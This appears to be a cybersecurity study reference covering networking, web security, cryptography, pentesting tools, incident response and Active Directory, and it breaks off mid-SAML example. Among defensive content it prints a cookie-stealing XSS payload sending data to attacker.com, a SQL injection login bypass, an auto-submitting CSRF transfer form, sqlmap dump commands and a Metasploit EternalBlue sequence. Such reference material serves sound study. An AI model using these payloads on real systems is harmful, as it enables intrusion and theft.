# Network Security

## TCP/IP Stack
**Purpose**: Foundation of internet communication

| Layer | OSI Model | TCP/IP Model | Protocols | Protocol Data Unit | Description |
|---|---|---|---|---|---|
| 7 | Application | Application | FTP, HTTP, Telnet, SMTP, DNS, SSH | Data | Network Process to application |
| 6 | Presentation | Application | JPEG, PNG, MPEG, Sockets, HTML, IMAP | Data | Data representation and encryption |
| 5 | Session | Application | NFS, SQL, PAP, RPC, RTP, API's | Data | Interhost communication |
| 4 | Transport | Transport | TCP, UDP, SSL, TLS | Segment (TCP) / Datagram (UDP) | End-to-end connection and reliability |
| 3 | Network | Internet | IPv4, IPv6, ICMP | Packet | Path determination (Logical addressing) |
| 2 | Data Link | Network Access | ARP, CDP, STP, VLAN, Switch, Bridge | Frame | MAC and LLC (Physical addressing) |
| 1 | Physical | Network Access | Ethernet, WI-FI, CAT, DSL, RJ45, 100Base-TX, Hub, Repeater | Bits | Media, signal and binary transmission |

## Network Protocols
```bash
# TCP Handshake
1. SYN → 2. SYN-ACK → 3. ACK

# HTTP vs HTTPS
HTTP: Port 80, plaintext
HTTPS: Port 443, TLS encrypted

# DNS Resolution
dig example.com
nslookup example.com
```

## Firewalls & IDS/IPS
```bash
# iptables (Linux firewall)
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Snort rule (IDS)
alert tcp any any -> 192.168.1.0/24 80 (msg:"HTTP Attack"; content:"../"; sid:1001;)
```

## VPN Technologies
- **IPSec**: Network layer VPN, site-to-site
- **OpenVPN**: SSL/TLS based, flexible
- **WireGuard**: Modern, fast, minimal attack surface
```bash
# OpenVPN client config
client
remote vpn.example.com 1194
proto udp
cert client.crt
key client.key
```

# Web Application Security

## OWASP Top 10
1. **Injection**: SQL, NoSQL, LDAP, OS command injection
2. **Broken Authentication**: Session management flaws
3. **Sensitive Data Exposure**: Weak encryption, plaintext storage
4. **XML External Entities (XXE)**: XML parser vulnerabilities
5. **Broken Access Control**: Unauthorized resource access
6. **Security Misconfiguration**: Default settings, verbose errors
7. **Cross-Site Scripting (XSS)**: Client-side code injection
8. **Insecure Deserialization**: Object injection attacks
9. **Known Vulnerabilities**: Outdated components
10. **Insufficient Logging**: Poor monitoring and response

## SQL Injection
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '" + input + "' AND password = '" + password + "'

-- Attack payload
admin' OR '1'='1' --

-- Resulting query
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''

-- Prevention: Parameterized queries
SELECT * FROM users WHERE username = ? AND password = ?
```

## Cross-Site Scripting (XSS)
```javascript
// Stored XSS
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Reflected XSS
http://vulnerable.com/search?q=<script>alert('XSS')</script>

// DOM-based XSS
document.getElementById('content').innerHTML = location.hash.substring(1);

// Prevention
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

## Cross-Site Request Forgery (CSRF)
```html
<!-- Malicious form -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

<!-- Prevention: CSRF token -->
<input type="hidden" name="_token" value="random_csrf_token">
```

## Content Security Policy (CSP)
CSP defines allowed content sources to mitigate XSS and data injection attacks.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'
```
* **default-src**: fallback
* **script-src/style-src/img-src**: allowed sources

## Strict-Transport-Security (HSTS)
The HSTS header ensures that web browsers will always connect over HTTPS.

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
* **max-age:** duration in seconds
* **includeSubDomains**: applies to all subdomains
* **preload**: eligible for browser preload lists

## X-Content-Type-Options
Prevents MIME type sniffing attacks by enforcing declared content types.

```http
X-Content-Type-Options: nosniff
```
* **nosniff**: browser must respect Content-Type header
* Prevents execution of non-executable MIME types

## Referrer-Policy
Controls how much referrer information is sent with requests.

```http
Referrer-Policy: strict-origin-when-cross-origin 
```
* **strict-origin-when-cross-origin:** full URL for same-origin, origin for cross-origin
* **strict-origin:** only origin for cross-origin requests
* **same-origin:** only for same-origin requests
* **no-referrer:** never send referrer

# Cryptography

## Symmetric Encryption
Symmetric encryption uses the same key for both encryption and decryption.

```python
# AES encryption
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
message = b"Secret message"
encrypted = cipher.encrypt(message)

# Decrypt
decrypted = cipher.decrypt(encrypted)
```

## Asymmetric Encryption
Asymmetric encryption uses a pair of keys: a public key for encryption and a private key for decryption.

```bash
# RSA key generation
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Encrypt with public key
openssl rsautl -encrypt -inkey public.pem -pubin -in message.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

## Digital Signatures
Digital signatures merge authentication, integrity, and non-repudiation, enabling verification of a message or document's authenticity.

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Sign message
message = b"Important message"
signature = private_key.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# Verify signature
public_key.verify(
    signature,
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
```

## Encoding & Data Representation
Encoding transforms data from one format to another for storage, transmission, or compatibility purposes (reversible without a key).

```bash
# Base64 encoding/decoding
echo "Hello World" | base64                    # SGVsbG8gV29ybGQK
echo "SGVsbG8gV29ybGQK" | base64 -d            # Hello World

# URL encoding
curl -G -d "param=hello world" http://example.com    # param=hello%20world

# Hex encoding
echo "Hello" | xxd                             # 48656c6c6f0a
echo "48656c6c6f" | xxd -r -p                  # Hello

# HTML encoding
&lt; &gt; &amp; &quot; &#39;                    # < > & " '
```

```python
import base64
import urllib.parse
import html

# Base64
data = "Hello World"
encoded = base64.b64encode(data.encode()).decode()    # SGVsbG8gV29ybGQ=
decoded = base64.b64decode(encoded).decode()          # Hello World

# URL encoding
url_encoded = urllib.parse.quote("hello world")      # hello%20world
url_decoded = urllib.parse.unquote(url_encoded)      # hello world

# HTML encoding
html_encoded = html.escape("<script>alert('xss')</script>")
html_decoded = html.unescape(html_encoded)
```

## Hashing
Hashing transforms data into a fixed-size string of characters, which is typically a digest that represents the original data.

```python
import hashlib

# SHA-256
message = "Hello World"
hash_object = hashlib.sha256(message.encode())
hash_hex = hash_object.hexdigest()

# Password hashing with salt
import bcrypt
password = "user_password"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)

# Verify password
bcrypt.checkpw(password.encode(), hashed)
```

# Penetration Testing

## Reconnaissance
```bash
# Subdomain enumeration
$ subfinder -d target.com
$ amass enum -d target.com

# Port scanning
$ nmap -sS -sV -O target.com       # Stealth scan with version detection and OS fingerprinting
$ nmap -sV -sC -p- target.com      # Scan all ports with default scripts and version detection

# Directory bruteforcing
$ dirb http://target.com /usr/share/wordlists/dirb/common.txt
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Wfuzz - Web application fuzzer
$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://target.com/FUZZ
$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404,403 http://target.com/FUZZ.php
$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --sc 200 http://target.com/FUZZ

# Ffuf - Fast web fuzzer written in Go
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://target.com/FUZZ -fc 404,403
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ/ -mc 200,301,302

# DNS enumeration
$ dig @8.8.8.8 target.com any     # Query all DNS records
$ nslookup -type=mx target.com    # Query MX records
$ fierce -dns target.com          # DNS reconnaissance
```

## Vulnerability Scanning
```bash
# Nessus scan
nessuscli -q localhost 8834 user pass scan new policy_id target_ip scan_name

# OpenVAS
openvas-cli -X '<create_task><name>Scan</name><target>target_ip</target></create_task>'

# Nikto web scanner
nikto -h http://target.com

# SQLmap
sqlmap.py -u "http://target.com/login" --dbs  # List databases
sqlmap.py -u "http://target.com/login" -D <database_name> --tables # List tables
sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> --columns # List columns
sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> -C <column_name> --dump # Dump data
```

## Exploitation Frameworks

### Metasploit
```bash
$ msfconsole                                      # Start Metasploit console
$ use exploit/windows/smb/ms17_010_eternalblue    # Select exploit
$ set RHOSTS target_ip                            # Set target IP
$ set LHOST attacker_ip                           # Set local IP  
$ exploit                                         # Launch exploit
```

### Burp Suite
Burp Suite is a popular web vulnerability scanner and proxy tool used for penetration testing of web applications.

Components:
- **Proxy**: Intercept and modify web traffic.
- **Target**: Define scope and map the application.
  
Features:
- **Intruder**: Automate fuzzing and brute-force attacks.
- **Repeater**: Edit and resend requests for testing.
- **Sequencer**: Analyze randomness (e.g., session tokens).
- **Decoder**: Encode/decode and transform data.
- **Comparer**: Compare responses or data sets.
- **Extender**: Add plugins and integrations.
- **Scanner**: Automated vulnerability scanning (Pro only).

<Details>
<summary>Burp Suite Commands & Usage</summary>

#### Intercept HTTP requests
To intercept and modify HTTP requests using Burp Suite, follow these steps:
1. Open Burp Suite and go to the "Proxy" tab.
2. Ensure "Intercept is on" (button should be highlighted).
3. Configure your browser to use Burp Suite as a proxy (default is localhost:8080).
4. Navigate to the target web application in your browser.
5. Burp Suite will capture the HTTP requests, allowing you to view and modify them before forwarding to the server.
6. After making modifications, click "Forward" in Burp Suite to send the request to the server.

#### Fuzzing with Intruder
1. Go to the "Intruder" tab and select "Positions".
2. Load a request (right-click in Proxy > Send to Intruder).
3. Clear existing payload positions and highlight the parts of the request you want to fuzz.
4. Click "Add §" to mark the positions.
5. Go to the "Payloads" tab, select the payload type (e.g., simple list, numbers, etc.), and load your payloads.
6. Click "Start attack" to begin fuzzing. Review the results for anomalies or vulnerabilities.

#### Repeating Requests with Repeater
1. Right-click on a request in the Proxy tab and select "Send to Repeater".
2. Go to the "Repeater" tab, where you can see the request.
3. Modify the request as needed (e.g., change parameters, headers).
4. Click "Send" to resend the modified request and view the response.

#### Analyzing Session Tokens with Sequencer
1. Right-click on a request containing a session token and select "Send to Sequencer".
2. Go to the "Sequencer" tab and start the analysis.
3. Review the results to assess the randomness and predictability of the token.

#### Decoding Data with Decoder
1. Go to the "Decoder" tab.
2. Paste the encoded data (e.g., Base64, URL-encoded).
3. Select the appropriate decoding method from the dropdown.
4. Click "Decode" to view the decoded data.

#### Comparing Responses with Comparer
1. Go to the "Comparer" tab.
2. Paste the first response in the left pane and the second response in the right pane.
3. Click "Compare" to see the differences highlighted.
</Details>

### OWASP ZAP
OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner.

**Core Features:**
- **Automated Scanner**: Passive and active scanning
- **Manual Tools**: Intercepting proxy, fuzzer, spider
- **API**: REST API for automation and CI/CD integration

```bash
# Basic scanning
$ zap-cli quick-scan http://target.com
$ zap-cli spider http://target.com
$ zap-cli active-scan http://target.com

# Advanced usage
$ zap.sh -cmd -quickurl http://target.com          # Quick scan via CLI
$ zap.sh -cmd -port 8080 -host 0.0.0.0             # Start daemon mode
$ zap.sh -cmd -quickprogress http://target.com     # Show scan progress

# API usage
curl "http://localhost:8080/JSON/spider/action/scan/?url=http://target.com"
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://target.com"
```

**ZAP Scripts:**
- **Authentication**: Custom login sequences
- **Session Management**: Handle complex session logic
- **Input Vectors**: Define custom attack points

# Incident Response

## NIST Framework
1. **Preparation**: Policies, procedures, tools
2. **Detection & Analysis**: Monitoring, investigation
3. **Containment**: Isolate threat, prevent spread
4. **Eradication**: Remove threat from environment
5. **Recovery**: Restore normal operations
6. **Lessons Learned**: Post-incident review

## Digital Forensics
Digital forensics involves the identification, preservation, analysis, and presentation of digital evidence.

```bash
# Memory dump
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Disk imaging
dd if=/dev/sda of=disk_image.dd bs=4K
ewfacquire /dev/sda -t evidence_file

# File analysis
file suspicious_file
strings suspicious_file
hexdump -C suspicious_file | head -20

# Network analysis
tcpdump -i eth0 -w capture.pcap                         # Capture all traffic
tcpdump -r capture.pcap 'port 80'                       # Read HTTP traffic
tcpdump -i eth0 'src host 192.168.1.1 and dst port 22'  # Filter SSH traffic

nc -l -p 4444                                            # Listen on port 4444
nc target.com 80                                        # Connect to target on port 80

wireshark capture.pcap                                  # Open capture in Wireshark
tshark -r capture.pcap -Y "http.request.method==POST"   # Filter POST requests
```

## Log Analysis
Log analysis is the process of reviewing and interpreting log files to identify security incidents, system errors, or performance issues.

```bash
# Apache logs
tail -f /var/log/apache2/access.log                 # Real-time log monitoring
grep "404" /var/log/apache2/access.log | head -10   # Find 404 errors

# System logs
journalctl -f                                       # Real-time system log monitoring  
grep "Failed password" /var/log/auth.log            # Failed SSH login attempts

# Windows Event Logs
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}    # Failed login attempts
```

## SIEM Tools

### Splunk
Splunk is a platform for searching, monitoring, and analyzing machine-generated big data through a web-style interface.

```bash
# Splunk Search Processing Language (SPL)
index=security sourcetype=firewall action=blocked           # Search blocked firewall events
index=web_logs status=404 | stats count by clientip         # Count 404 errors by IP
index=windows EventCode=4625 | timechart count by src_ip    # Failed login attempts over time

# Splunk commands
./splunk start                                              # Start Splunk
./splunk stop                                               # Stop Splunk
./splunk add monitor /var/log/apache2/access.log           # Add log file monitoring
./splunk list inputstatus                                  # Check input status

# Search examples
sourcetype=access_combined | eval hour=strftime(_time,"%H") | stats count by hour
index=security | where match(src_ip, "^192\.168\.1\.")     # Filter by IP range
index=* | search "failed" OR "error" | head 100            # Search for failures
```

**Key Features:**
- **Real-time monitoring**: Live dashboards and alerts
- **Machine learning**: Anomaly detection and predictive analytics
- **Correlation**: Link events across different data sources
- **Visualization**: Charts, graphs, and custom dashboards

### ELK Stack (Elasticsearch, Logstash, Kibana)
Open-source platform for collecting, parsing, storing, and visualizing log data.

#### Logstash Configuration
```ruby
# /etc/logstash/conf.d/apache.conf
input {
  file {
    path => "/var/log/apache2/access.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{COMBINEDAPACHELOG}" }
  }

  date {
    match => [ "timestamp", "dd/MMM/yyyy:HH:mm:ss Z" ]
  }

  mutate {
    convert => { "response" => "integer" }
    convert => { "bytes" => "integer" }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "apache-logs-%{+YYYY.MM.dd}"
  }
}
```

#### Elasticsearch Queries
```bash
# Basic search
curl -X GET "localhost:9200/apache-logs-*/_search?q=response:404"

# Aggregation query
curl -X GET "localhost:9200/apache-logs-*/_search" -H 'Content-Type: application/json' -d'
{
  "aggs": {
    "top_ips": {
      "terms": {
        "field": "clientip.keyword",
        "size": 10
      }
    }
  }
}'

# Time-based query
curl -X GET "localhost:9200/apache-logs-*/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "range": {
      "@timestamp": {
        "gte": "2024-01-01",
        "lte": "2024-01-31"
      }
    }
  }
}'
```

#### Kibana Dashboards
```json
# Sample visualization for top source IPs
{
  "visualization": {
    "title": "Top Source IPs",
    "type": "pie",
    "params": {
      "grid": {"categoryLines": false, "style": {"color": "#eee"}},
      "categoryAxes": [{"id": "CategoryAxis-1", "type": "category", "position": "bottom"}],
      "valueAxes": [{"id": "ValueAxis-1", "name": "LeftAxis-1", "type": "value", "position": "left"}]
    }
  }
}
```

#### ELK Management Commands
```bash
# Elasticsearch
systemctl start elasticsearch                            # Start Elasticsearch
curl -X GET "localhost:9200/_cluster/health"             # Check cluster health
curl -X GET "localhost:9200/_cat/indices?v"              # List indices

# Logstash
/usr/share/logstash/bin/logstash -t                       # Test configuration
systemctl start logstash                                  # Start Logstash
tail -f /var/log/logstash/logstash-plain.log              # Monitor logs

# Kibana
systemctl start kibana                                    # Start Kibana
# Access via http://localhost:5601
```

# Types of Cyber Attacks

## Malware Types
**Malware** is malicious software designed to harm, exploit, or gain unauthorized access to computer systems.

### Virus
- **Definition**: Self-replicating code that attaches to executable files
- **Behavior**: Requires host file execution to spread
- **Example**: Boot sector viruses, file infectors
```bash
# Detection
clamscan -r /home/user/                   # ClamAV scan
rkhunter --check                          # Rootkit detection
```

### Worm
- **Definition**: Self-propagating malware that spreads across networks
- **Behavior**: Replicates independently without user interaction
- **Examples**: Code Red, Conficker, WannaCry
```bash
# Network monitoring for worm activity
netstat -tuln | grep LISTEN              # Check listening ports
ss -tuln                                 # Modern alternative
tcpdump -i any 'port 445'                # Monitor SMB traffic (common worm vector)
```

### Trojan Horse
- **Definition**: Appears legitimate but contains malicious code
- **Behavior**: Relies on social engineering for installation
- **Examples**: Remote Access Trojans (RATs), banking trojans

### Ransomware
- **Definition**: Encrypts victim's files and demands payment
- **Behavior**: File encryption + ransom note display
- **Examples**: WannaCry, Locky, CryptoLocker
```bash
# Prevention/Recovery
# Regular backups
rsync -av --delete /data/ /backup/
# File integrity monitoring
aide --check
```

### Spyware
- **Definition**: Secretly collects user information
- **Behavior**: Keylogging, screen capture, data theft
- **Examples**: Keyloggers, screen recorders

### Adware
- **Definition**: Displays unwanted advertisements
- **Behavior**: Pop-ups, browser hijacking, tracking

### Rootkit
- **Definition**: Hides malicious activity from detection
- **Behavior**: Kernel-level or user-level system modification
- **Detection**: Behavioral analysis, memory forensics
```bash
# Rootkit detection tools
chkrootkit                               # Check for rootkits
rkhunter --check                         # Rootkit Hunter
unhide proc                              # Find hidden processes
```

### Botnet
- **Definition**: Network of compromised computers (bots/zombies)
- **Behavior**: Centralized command and control (C&C)
- **Usage**: DDoS attacks, spam, cryptocurrency mining

## Attack Vectors

### Phishing
- **Email phishing**: Fraudulent emails requesting credentials
- **Spear phishing**: Targeted attacks on specific individuals
- **Whaling**: Attacks targeting high-profile executives
- **Smishing**: SMS-based phishing
- **Vishing**: Voice/phone-based phishing

### Social Engineering
- **Pretexting**: Creating fake scenarios to gain trust
- **Baiting**: Offering something enticing (USB drops)
- **Tailgating**: Following authorized personnel into secure areas
- **Quid pro quo**: Offering services in exchange for information

### Advanced Persistent Threats (APT)
- **Definition**: Long-term, stealthy attacks by skilled adversaries
- **Characteristics**: Multi-stage, persistent presence, targeted
- **Examples**: APT1 (China), Lazarus Group (North Korea)

## DDoS (Distributed Denial of Service) Attacks
DDoS attacks overwhelm target systems with traffic from multiple sources to disrupt normal operations.

### Volume-Based Attacks (Volumetric)
**Goal**: Consume bandwidth or network resources
- **UDP Flood**: Sends large volumes of UDP packets to random ports
- **ICMP Flood**: Overwhelms target with ICMP Echo Request packets
- **Spoofed Packet Flood**: Uses spoofed IP addresses to hide attack source

```bash
# Detection and mitigation
# Monitor network traffic
iftop -i eth0                            # Real-time bandwidth usage
netstat -s | grep -i drop                # Check dropped packets
tcpdump -i any icmp                      # Monitor ICMP traffic

# Rate limiting with iptables
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

### Protocol Attacks
**Goal**: Consume server resources (CPU, memory, connection tables)
- **SYN Flood**: Half-open TCP connections exhaust connection table
- **Ping of Death**: Oversized packets cause buffer overflows
- **Smurf Attack**: ICMP broadcast with spoofed source IP

```bash
# SYN flood protection
echo 1 > /proc/sys/net/ipv4/tcp_syncookies        # Enable SYN cookies
sysctl -w net.ipv4.tcp_max_syn_backlog=2048       # Increase SYN backlog

# Monitor half-open connections
netstat -an | grep SYN_RECV | wc -l               # Count SYN_RECV connections
ss -s                                              # Connection statistics
```

### Application Layer Attacks (Layer 7)
**Goal**: Exhaust application resources with seemingly legitimate requests
- **HTTP Flood**: High volume of HTTP GET/POST requests
- **Slowloris**: Slow, partial HTTP requests to exhaust connection pool
- **R.U.D.Y. (R-U-Dead-Yet)**: Slow POST requests with incomplete data

```bash
# Application monitoring
apache2ctl status                         # Apache server status
nginx -t && nginx -s reload              # Nginx configuration test

# Rate limiting in Nginx
limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
limit_req zone=one burst=5;

# Fail2ban for automated blocking
fail2ban-client status                    # Check fail2ban status
fail2ban-client set apache-overflows bantime 3600
```

### Amplification Attacks
**Goal**: Amplify attack traffic using vulnerable services that respond with larger packets
- **DNS Amplification**: Small DNS queries → Large DNS responses
- **NTP Amplification**: Uses NTP monlist command for 200x amplification
- **Memcached Amplification**: Up to 51,000x amplification factor
- **SSDP Amplification**: UPnP Simple Service Discovery Protocol

```bash
# DNS amplification detection
dig @8.8.8.8 ANY isc.org                 # Large DNS response test
tcpdump -i any 'port 53 and greater 512' # Monitor large DNS packets

# NTP amplification check
ntpdc -c monlist target.ntp.server       # Check if monlist is enabled
ntpq -c rv target.ntp.server             # Query NTP server

# Memcached protection
memcached -l 127.0.0.1                   # Bind to localhost only
iptables -A INPUT -p udp --dport 11211 -s ! 127.0.0.1 -j DROP

# Prevention: Disable reflector services
systemctl disable avahi-daemon           # Disable SSDP
echo "disable monitor" >> /etc/ntp.conf  # Disable NTP monlist
```

### DDoS Mitigation Strategies
```bash
# Network-level mitigation
# Rate limiting
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# Block specific attack patterns
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP          # Christmas tree packets
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP         # Null packets

# Geographic blocking (using GeoIP)
iptables -A INPUT -m geoip --src-cc CN,RU -j DROP

# Traffic analysis
# Monitor connection counts
netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

# Top source IPs
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n

# Bandwidth monitoring
vnstat -i eth0 -h                        # Hourly traffic stats
```

# Malware Analysis

## Static Analysis
Static analysis involves examining the code or binary of a program without executing it, to understand its structure, functionality, and potential malicious behavior.

```bash
# File information
file malware.exe
objdump -x malware.exe
strings malware.exe | grep -i "http\|ftp\|\.dll"

# Packing detection
peid malware.exe
upx -t malware.exe

# Hash calculation
md5sum malware.exe
sha256sum malware.exe

# VirusTotal API
curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' -F 'key=YOUR_API_KEY' -F 'file=@malware.exe'
```

## Dynamic Analysis
Dynamic analysis involves executing the program in a controlled environment to observe its behavior, interactions, and effects on the system.

```bash
# Sandbox analysis
cuckoo submit malware.exe
cuckoo analysis info 1

# Process monitoring
strace -f -e trace=open,write,network ./malware
ltrace ./malware

# Network monitoring
netstat -tulpn
tcpdump -i any -w malware_traffic.pcap

# File system monitoring
inotifywait -m -r /tmp/
```

## Reverse Engineering
Reverse engineering is the process of analyzing a compiled program to understand its design, architecture, and functionality, often to identify vulnerabilities or malicious behavior.

```bash
# Disassembly
objdump -d malware.exe          # Disassemble binary
radare2 malware.exe             # Open in radare2
gdb malware.exe                 # Debugging with gdb

# Decompilation
retdec-decompiler malware.exe   # Decompile binary 
ghidra malware.exe              # Open in Ghidra to analyze code structure
```

# Cloud Security

## AWS Security
```bash
# IAM policies
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*"
    }
  ]
}

# S3 bucket policy
aws s3api put-bucket-policy --bucket my-bucket --policy file://policy.json

# CloudTrail logs
aws logs describe-log-groups
aws logs filter-log-events --log-group-name CloudTrail --filter-pattern "ERROR"

# Security Groups
aws ec2 describe-security-groups
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 10.0.0.0/8
```

## Container Security
```dockerfile
# Secure Dockerfile
FROM alpine:3.14
RUN adduser -D -s /bin/sh appuser
USER appuser
COPY --chown=appuser:appuser app /app
WORKDIR /app
CMD ["./app"]
```

```bash
# Docker security scanning
docker scan image:tag
trivy image image:tag

# Kubernetes security
kubectl get pods --all-namespaces
kubectl describe pod pod-name
kubectl logs pod-name

# Network policies
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

# Identity & Access Management
## General Concepts
- **Authentication**: Verifying identity (e.g., passwords, biometrics)
- **Authorization**: Granting access to resources based on permissions
- **Accounting**: Tracking user activities (logs, audits)
- **MFA (Multi-Factor Authentication)**: Using multiple methods to verify identity (e.g., password + OTP)
- **SSO (Single Sign-On)**: One set of credentials for multiple applications
- **OAuth**: Authorization framework for third-party access
- **OpenID Connect**: Identity layer on top of OAuth 2.0 for authentication
- **SAML (Security Assertion Markup Language)**: XML-based framework for exchanging authentication and authorization data
- **RBAC (Role-Based Access Control)**: Access based on user roles
- **IAM (Identity and Access Management)**: Framework for managing digital identities and access rights
- **Principle of Least Privilege**: Users get the minimum access necessary
- **Federation**: Trusting identities from external systems (e.g., SAML, OAuth)
- **Provisioning/Deprovisioning**: Creating/removing user accounts and access
- **Directory Services**: Centralized user and resource management (e.g., LDAP, Active Directory)
  
## Active Directory
An Active Directory (AD) domain is the basic security and administrative unit that groups related objects like users and computers under a single namespace (e.g., example.com), handling authentication and policies.

### **Logical Structure**
* **Domain** → A group of computers, users, and devices that share the same directory and security rules.
* **Tree** → A collection of related domains connected in a hierarchy under a single name.
* **Forest** → The highest level, containing multiple trees that work together but can have different rules.

### **AD Components**
* **Directory:** Hierarchical structure storing information about network objects (users, computers, devices).
* **Directory Service:** Provides methods for storing, retrieving, and managing directory data for network
users and administrators.
* **Domain Controller (DC)** → The server that runs AD. Stores the database (`NTDS.dit`) and handles authentication/authorization.
* * **Sites** → Physical locations with DCs. Help optimize replication and authentication traffic.
* * **Trusts** → Relationships between domains/forests to allow resource sharing.
* **Replication** → DCs sync with each other to stay updated.

### **Objects in AD**

* **Users** → Accounts representing people.
* **Groups** → Collections of users (or other groups). Used for permissions.
* **Computers** → Machine accounts for PCs and servers.
* **OUs (Organizational Units)** → Containers that organize objects (users, groups, computers). Like folders.
* **Group Policy Objects (GPOs)** → Rules applied to OUs (e.g., password complexity, desktop wallpaper, software install).

### **Authentication & Access**

* **Kerberos** → Default authentication protocol in AD (ticket-based).
  * **KRBTGT account:** Service account used by KDC to encrypt/decrypt TGTs.
  * **KDC (Key Distribution Center):** Issues tickets and manages keys. It consists of two main components:
    * **AS (Authentication Service):** Authenticates users and issues Ticket Granting Tickets (TGTs).
    * **TGS (Ticket Granting Service):** Issues service tickets based on a valid TGT for access to specific services.
  * **Tickets**
    * **TGT (Ticket Granting Ticket):** Provided by the KDC after initial authentication.
    * **Service Tickets:** Issued by the Ticket Granting Service (TGS) to access a specific resource or service. for accessing specific services.
  * **Attacks**
    * **Pass-the-Ticket (PtT):** Using stolen Kerberos tickets to access resources.
    * **Kerberoasting:**  Offline brute force of service account passwords from captured service tickets.
    * **Golden Ticket:** Forging TGT using the KRBTGT account’s hash from a compromised domain controller.
    * **Silver Ticket:** Forging service tickets using service account password hashes.
  * **SPN (Service Principal Name):** Unique identifier for services in Kerberos.
* **LDAP (Lightweight Directory Access Protocol)** → Protocol to query and modify AD data.
* **RADIUS** → Protocol that handles remote authentication and authorization (often for network access like VPNs or Wi-Fi)
* **NTLM** → Older fallback authentication protocol. Still used as a backup.

```powershell
# User management
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@domain.com"
Get-ADUser -Filter "Name -like '*John*'"
Set-ADAccountPassword -Identity jdoe -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Group management
New-ADGroup -Name "Security Team" -GroupScope Global
Add-ADGroupMember -Identity "Security Team" -Members jdoe

# Password policy
Get-ADDefaultDomainPasswordPolicy
Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 12 -PasswordHistoryCount 24
```

## LDAP
```bash
# LDAP search
ldapsearch -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com" "(objectClass=person)"

# Add user
ldapadd -x -H ldap://dc.example.com -D "cn=admin,dc=example,dc=com" -W -f newuser.ldif
```

## Single Sign-On (SSO)
SSO allows users to authenticate once and gain access to multiple systems without re-entering credentials.

### SAML (Security Assertion Markup Language)
SAML is an XML-based framework for exchanging authentication and authorization data between parties, typically an identity provider (IdP) and a service provider (SP).

```xml
<!-- SAML Assertion -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">user@example.com</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="Role">
      <saml:AttributeValue>Admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
